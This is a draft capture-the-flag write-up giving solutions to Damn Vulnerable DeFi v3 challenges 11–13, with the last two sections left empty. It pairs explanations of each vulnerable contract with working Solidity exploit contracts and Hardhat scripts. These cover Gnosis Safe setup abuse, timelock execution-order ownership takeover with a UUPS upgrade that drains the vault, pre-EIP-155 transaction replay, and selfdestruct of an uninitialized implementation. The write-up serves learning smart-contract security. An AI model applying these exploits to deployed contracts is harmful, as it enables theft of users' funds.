---
title: 'Damn Vulnerable Defi V3 Solutions Part 3: 11-15'
date: 2024-01-07T13:25:00+08:00
draft: true
tags: ["ctf"]
---

## Introduction

This series of posts provides solutions for version 3 of Damn Vulnerable DeFi, which includes a total of 15 challenges.

This is the Part 3 of Damn Vulnerable Defi Solution series:
- [Part 1](../damn-vulnerable-defi-v3-solutions-part-1)
- [Part 2](../damn-vulnerable-defi-v3-solutions-part-2)
- Part 3 (Current)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/damn-vulnerable-defi).

This post will focus on solutions for challenges 11-15. These final five challenges are the most complex in the series, encompassing highly realistic use cases, including Gnosis Safe Wallets, Uniswap V3, the UUPS Upgradeable pattern, timelocks, and more. Tackling these challenges demands extensive background knowledge about the functioning of actual contract code, and I have gained significant insights from solving them.

## Solutions

### 11. Backdoor

This is a complicated challenge that requries knowledge of the [Gnosis Safe Wallet](https://docs.safe.global/getting-started/readme). At the time solving this, my knowledge of Gnosis Safe was limited, so I didn't solve it independently. However, I found this [excellent writeup](https://www.linkedin.com/pulse/damn-vulnerable-defi-v3-backdoor-challenge-11-solution-johnny-time-bsmee/) very helpful during my attempt.

A crucial aspect of Gnosis Safe's design is its use of the Minimal proxy pattern. This means all user wallets essentially being proxies that point to a single master contract.

The challenge consists of 2 parts:
1. A `WalletRegistry` that distributes DVT tokens to registered Gnosis Safe proxy wallets with specific owners.
2. Gnosis Safe related code, which includes a `GnosisSafeProxyFactory`, `GnosisSafeProxy`, and the primary `GnosisSafe` singleton.

By reading the Gnosis Safe code, we can see that the creation of a Gnosis Safe wallet doesn't rely on `msg.sender` to determine the owner (as its main function is as a multisig wallet). Instead, it uses initializer data to set up owners, allowing anyone to create a wallet on behalf of someone else.

`GnosisSafeProxyFactory.sol` code:
```sol
    /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    function createProxyWithNonce(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce
    ) public returns (GnosisSafeProxy proxy) {
        proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);
        if (initializer.length > 0)
            // solhint-disable-next-line no-inline-assembly
            assembly {
                if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                    revert(0, 0)
                }
            }
        emit ProxyCreation(proxy, _singleton);
    }

    /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (GnosisSafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }

```

`GnosisSafe.sol` code:
```sol
    /// @dev Setup function sets initial storage of contract.
    /// @param _owners List of Safe owners.
    /// @param _threshold Number of required confirmations for a Safe transaction.
    /// @param to Contract address for optional delegate call.
    /// @param data Data payload for optional delegate call.
    /// @param fallbackHandler Handler for fallback calls to this contract
    /// @param paymentToken Token that should be used for the payment (0 is ETH)
    /// @param payment Value that should be paid
    /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }
```

It's important to note that within the `setupModules` function, there's a `delegatecall` made to an externally specified address by the user. This feature is intended for setting up the modules used by the wallet. However, it is also out entry point of exploitation.

`ModuleManager.sol` code:
```sol
    function setupModules(address to, bytes memory data) internal {
        require(modules[SENTINEL_MODULES] == address(0), "GS100");
        modules[SENTINEL_MODULES] = SENTINEL_MODULES;
        if (to != address(0))
            // Setup has to complete successfully or transaction fails.
            require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
    }
```

Up until this point, the process of creating a proxy wallet is clear.

```
User
  |
  | (call)
  v
GnosisSafeProxyFactory
  |
  | (call)
  v
GnosisSafeProxy
  |
  | (delegatecall)
  v
GnosisSafe
  |
  | (delegatecall)
  v
External Code
```

We know that when a Gnosis Safe proxy wallet is created, the `WalletRegistry` sends DVT tokens to it. Therefore, our solution would be making the proxy approve us the DVT tokens during the execution of the external code at its creation. The final exploit code would be:

```sol
contract WalletRegistryAttacker {

    address singleton;
    GnosisSafeProxyFactory proxyFactory;
    WalletRegistry registry;
    // The `immutable` here is crucial, without it the delegatecall call would end up calling with caller's
    // storage data, which would fail.
    DamnValuableToken immutable token;

    constructor(address addr1, address addr2, address addr3, address addr4) {
        singleton = addr1;
        proxyFactory = GnosisSafeProxyFactory(addr2);
        registry = WalletRegistry(addr3);
        token = DamnValuableToken(addr4);
    }

    function approve(address addr) public {
        token.approve(addr, 10 ether);
    }

    function attack(address[] memory beneficiaries) public payable {
        for (uint256 i = 0; i < 4; ++i) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector, // Selector for the setup() function call
                    beneficiary, // _owners =>  List of Safe owners.
                    1, // _threshold =>  Number of required confirmations for a Safe transaction.
                    address(this), //  to => Contract address for optional delegate call.
                    abi.encodeWithSignature("approve(address)", address(this)), // data =>  Data payload for optional delegate call.
                    address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                    0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                    0, // payment => Value that should be paid
                    0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
                ),
                0, // salt
                IProxyCreationCallback(registry)
            );
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}

```

### 12. Climber

This challenge is a combination of UUPS upgradeable pattern and timelocks. It consists of two parts:
1. A vault contract employing the UUPS upgradeable pattern, which holds tokens. Our aim here is to drain these tokens.
2. A timelock that acts as the owner of the vault.

Upon reviewing the contract code, it becomes apparent that our primary objective is to gain control of the timevault. Once in control, we can transfer the vault's ownership to ourselves and subsequently upgrade the vault code to a version that allows us to drain the tokens.

A notable vulnerability lies in the `execute()` function of the timelock contract. This function lacks ownership checks, meaning anyone can call `execute()`. More critically, it processes the input calldata before verifying the operation's state. This flaw provides an opening for our exploit: we can manipulate the timelock to execute some code and circumvent the `getOperationState(id) != OperationState.ReadyForExecution` check. 

`ClimberTimelock.sol` code:
```sol
    /**
     * Anyone can execute what's been scheduled via `schedule`
     */
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length;) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
            unchecked {
                ++i;
            }
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }
```

`ClimberTimelockBase.sol` code:
```sol
    function getOperationState(bytes32 id) public view returns (OperationState state) {
        Operation memory op = operations[id];

        if (op.known) {
            if (op.executed) {
                state = OperationState.Executed;
            } else if (block.timestamp < op.readyAtTimestamp) {
                state = OperationState.Scheduled;
            } else {
                state = OperationState.ReadyForExecution;
            }
        } else {
            state = OperationState.Unknown;
        }
    }
```

We can manipulate the `ClimberTimelock` to execute any operation by scheduling it post-execution. This approach enables us to ultimately transfer the ownership of `ClimberVault` to ourselves, thereby successfully completing the challenge.

Exploit contract:
```sol
contract ClimberAttacker {

    ClimberVault vault;
    DamnValuableToken token;
    ClimberTimelock timeclock;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(address _vaultAddress, address _tokenAddress) {
        vault = ClimberVault(_vaultAddress);
        token = DamnValuableToken(_tokenAddress);
        timeclock = ClimberTimelock(payable(vault.owner()));
    }

    function attack() public {
        targets[0] = address(timeclock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);

        targets[2] = address(timeclock);
        values[2] = 0;
        // We cannot use `_setupRole` here because it is a external function call (even though the contract is calling itself).
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("timelockSchedule()");

        timeclock.execute(targets, values, dataElements, 0);
    }

    function timelockSchedule() public {
        timeclock.schedule(targets, values, dataElements, 0);
    }
}

// Upgrade original contract to this one so we can sweep the funds.
contract ClimberVaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // Sweep funds.
    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

```

It's also important to note that the challenge's code utilizes [Hardhat UUPS Upgradeable APIs](https://docs.openzeppelin.com/upgrades-plugins/1.x/api-hardhat-upgrades#deploy-proxy) for setting up the context. To understand how to execute a UUPS upgrade, we can refer to the documentation provided by Hardhat on this topic.

```js
    it('Execution', async function () {
        // 1. Exploit `ClimberTimelock` to set vault owner to player.
        const attacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(
            vault.address,
            token.address
        );
        await attacker.attack();
        expect(await vault.owner()).to.eq(player.address);

        // 2. Upgrade original `ClimberVault` to `ClimberVault` where we can easily sweep all the tokens.
        const climberVaultAttackerFactory = await ethers.getContractFactory("ClimberVaultAttacker", attacker);
        const climberVaultAttacker = await upgrades.upgradeProxy(vault.address, climberVaultAttackerFactory);
        await climberVaultAttacker.connect(player).sweepFunds(token.address);
    });
```

### 13. Wallet Mining

This is a challenging task that involves two key areas of knowledge. The first part demands an understanding of cross-chain replay attacks, similar to what happened in the [Optimism Hack in 2022](https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY). The second part requires in-depth knowledge of the UUPS upgradeable pattern, particularly the distinction between proxy and implementation contracts, along with some grasp of Yul assembly language.

Let's tackle each challenge step by step:

#### 1. Draining `DEPOSIT_ADDRESS`

We start by aiming to drain the 20 million DVT tokens in `DEPOSIT_ADDRESS`. In the context of the challenge, it's identified as a Gnosis Safe proxy wallet. However, since we are operating on a local hardhat chain, this wallet, along with the Gnosis Safe master contract and proxy factory, hasn't been deployed. Our objective is to replicate a replay attack and transfer the Gnosis Safe deployment from the Ethereum mainnet to our local hardhat chain.

By examining etherscan, we can locate the deployment transactions for Gnosis Safe’s MasterCopy and ProxyFactory:
- https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
- https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3

Notably, the deployer address `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a` is consistent across these deployments, and these represent the first and third transactions of the deployer.

To conduct a replay attack on our local chain, we can retrieve the raw transaction data from Etherscan. It's crucial to replay all transactions (1-3) as the blockchain tracks a user’s nonce value.

Having deployed the Gnosis Safe ProxyFactory on our local chain, we must next determine how it deployed the `DEPOSIT_ADDRESS`. By analyzing the contract code (available publicly on Etherscan), we find two methods for creating a proxy contract: `CREATE` and `CREATE2`. However, a reasonable assumption is that `CREATE` was used (since guessing the random salt for `CREATE2` would be impractical). Attempting to brute-force the nonce value for `CREATE` to match `DEPOSIT_ADDRESS`, we discover success on the 43rd attempt.

[Gnosis Safe Proxy Factory Code](https://etherscan.io/address/0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b#code)
```
    /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
    /// @param masterCopy Address of master copy.
    /// @param data Payload for message call sent to new proxy contract.
    function createProxy(address masterCopy, bytes memory data)
        public
        returns (Proxy proxy)
    {
        proxy = new Proxy(masterCopy);
        if (data.length > 0)
            // solium-disable-next-line security/no-inline-assembly
            assembly {
                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }
            }
        emit ProxyCreation(proxy);
    }
    /// ...
    /// @dev Allows to create new proxy contact using CREATE2 but it doesn't run the initializer.
    ///      This method is only meant as an utility to be called from other methods
    /// @param _mastercopy Address of master copy.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    function deployProxyWithNonce(address _mastercopy, bytes memory initializer, uint256 saltNonce)
        internal
        returns (Proxy proxy)
    {
        // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint256(_mastercopy));
        // solium-disable-next-line security/no-inline-assembly
        assembly {
            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
        }
        require(address(proxy) != address(0), "Create2 call failed");
    }
```

In conclusion, the final step involves deploying 42 dummy proxies. On the 43rd attempt, we deploy our attack wallet, which then enables us to successfully drain the 20 million tokens.

Attack Wallet code:
```sol
contract MockWallet {
    function attack(address _token, address _player) public {
        DamnValuableToken(_token).transfer(_player, 20000000 ether);
    }
}
```

It's important to also note that cross-chain replay attacks of this nature are only feasible for transactions that occurred before the implementation of EIP-155. EIP-155 introduced the use of the chain ID as part of the transaction signing process, which serves as a safeguard against transaction replay attacks.

#### 2. Draining `WalletDeployer`


Notice that the `WalletDeployer` uses `AuthorizerUpgradeable` to verify if it can execute the drop() function, which sends 1 ether to the sender. The `AuthorizerUpgradeable` contract employs the UUPS Upgradeable pattern, but there contains a vulnerability.

The UUPS Upgradeable pattern involves two components: a proxy contract and an implementation contract. The proxy is designed to pass all calls (using `delegatecall`) to the implementation contract, with all data storage maintained in the proxy contract. The vulnerability arises because the implementation contract doesn't disable initialization in its constructor. As a result, it remains uninitialized, allowing anyone to claim ownership by calling the init function. (Note: You might wonder why the UUPS Upgradeable pattern doesn't force disabling initializer in constructors. I raised this question on OpenZeppelin's forum but didn't receive a response. So, I sought an answer from ChatGPT. For more details, see [this thread](https://forum.openzeppelin.com/t/can-disableinitializers-in-constructors-made-mandatory-for-uupsupgradeable-contracts/38927/2).)

[OpenZeppelin's Initializable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol#L39-L55)

```sol
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
 * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() {
 *     _disableInitializers();
 * }
 * ```
 * ====
```

Additionally, the implementation contract permits external calls to execute `upgradeToAndCall()` without verifying if it's being called within a proxy context. This means that once we've taken ownership, we can use it to execute a `delegatecall` as the implementation contract. The proper approach would involve implementing a proxy check, similar to what is done in OpenZeppelin's `UUPSUpgradeable.sol` contract.

[OpenZeppelin UUPSUpgradeable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol#L86-L89)
```sol
    /**
     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call
     * encoded in `data`.
     *
     * Calls {_authorizeUpgrade}.
     *
     * Emits an {Upgraded} event.
     *
     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
     */
    function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy {
        _authorizeUpgrade(newImplementation);
        _upgradeToAndCallUUPS(newImplementation, data);
    }
```

Finally, let's examine the can() function used by WalletDeployer to validate addresses. This function checks whether staticcall() returns true. However, staticcall() can return true even if the address doesn't contain any code. Therefore, we can simply self-destruct the implementation contract to bypass this check. For more information on how this works, refer to the [Solidity docs](https://docs.soliditylang.org/en/v0.8.23/control-structures.html#error-handling-assert-require-revert-and-exceptions)

```sol
    // TODO(0xth3g450pt1m1z0r) put some comments
    function can(address u, address a) public view returns (bool) {
        assembly { 
            let m := sload(0)
            if iszero(extcodesize(m)) {return(0, 0)}
            let p := mload(0x40)
            mstore(0x40,add(p,0x44))
            mstore(p,shl(0xe0,0x4538c4eb))
            mstore(add(p,0x04),u)
            mstore(add(p,0x24),a)
            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
        }
        return true;
    }
```

Contract code for self-destructing the UUPS implementation contract.
```sol
contract FakeAuthorizer is UUPSUpgradeable {

    function attack() public {
        selfdestruct(payable(address(0)));
    }

    function _authorizeUpgrade(address imp) internal override {}
}
```

#### 3. Wrap it up
```js
    it('Execution', async function () {
        // First, find the deployer who deployed the ProxyFactory and MasterCopy (do this on etherscan) - `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a`.
        // - https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
        // - https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3

        // Then, we can find the deployment of MasterCopy and ProxyFactory is the 1st and 3rd transaction of the deployer.
        // - https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a

        // Finally, since the transactions are done BEFORE EIP-155, it does not contain chainId information in the transaction data, which means we can perform
        // a replay attack on our local chain.
        const deployer = `0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A`;
        await player.sendTransaction({
          from: player.address,
          to: deployer,
          value: ethers.utils.parseEther("1"),
        });

        // Mock the first 2 transactions of deployer, and deploy the `GnosisSafeProxyFactory` which should have the address of `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`.
        await ethers.provider.sendTransaction(firstTx);
        await ethers.provider.sendTransaction(secondTx);
        const txReceipt = await (await ethers.provider.sendTransaction(createFactoryTx)).wait();
        const proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(txReceipt.contractAddress);
        expect(txReceipt.contractAddress).to.be.equal(`0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`);

        // Calculate the nonce of the deployment of `GnosisSafeProxyFactory`. Since it uses `create`, we can bruteforce the nonce.
        // nonce == 43.
        // for (let i = 1; i < 50; i++) {
        //   const addr = ethers.utils.getContractAddress({
        //   from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
        //   nonce: i,
        // });
        // if (addr == "0x9B6fb606A9f5789444c17768c6dFCF2f83563801") {
        //   console.log("Deposit deployment nonce", i);
        // }
        // }

        // Deploy mockWallet to drain funds from `DEPOSIT_ADDRESS`.
        const mockWalletFactory = await ethers.getContractFactory("MockWallet");
        const mockWallet = await mockWalletFactory.deploy();
        for (let i = 1; i <= 42; i++) {
            await proxyFactory.createProxy(mockWallet.address, []);
        }
        const payload = mockWalletFactory.interface.encodeFunctionData("attack", [
            token.address,
            player.address,
        ]);
        await proxyFactory.createProxy(mockWallet.address, payload);

        // We can to upgrade the `AuthorizerUpgradeable` to bypass the `can()` check. This is because the contract does not run `_disableInitializers()`
        // in its constructor, so we can directly take control of its ownership by calling its `init()` function.
        // UUPSUpgradable Implementation Slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        const implementationSlot = await ethers.provider.getStorageAt(authorizer.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
        const implementationAddr = `0x` + implementationSlot.slice(-40);

        // Connect `AuthorizerUpgradeable` to be its owner.
        const authorizerUpgradeable = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(implementationAddr);
        await authorizerUpgradeable.connect(player).init([], []);

        // Deploy `FakeAuthorizer` for upgrade.
        const fakeAuthorizerFactory = (await ethers.getContractFactory("FakeAuthorizer"));
        const fakeAuthorizer = await fakeAuthorizerFactory.deploy();

        // Upgrade the `AuthorizerUpgradeable`'s logic contract to our `FakeAuthorizer`.
        await authorizerUpgradeable
          .connect(player)
          .upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerFactory.interface.encodeFunctionData("attack", []));

        // The `can()` function on `walletDeployer` should be true by now.
        expect(await walletDeployer.can(player.address,DEPOSIT_ADDRESS)).to.be.true;

        // Run `drop()` 43 times to drain all of `walletDeployer` tokens.
        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([]);
        }

    });
```

### 14. Puppet V3

### 15. ABI Smuggling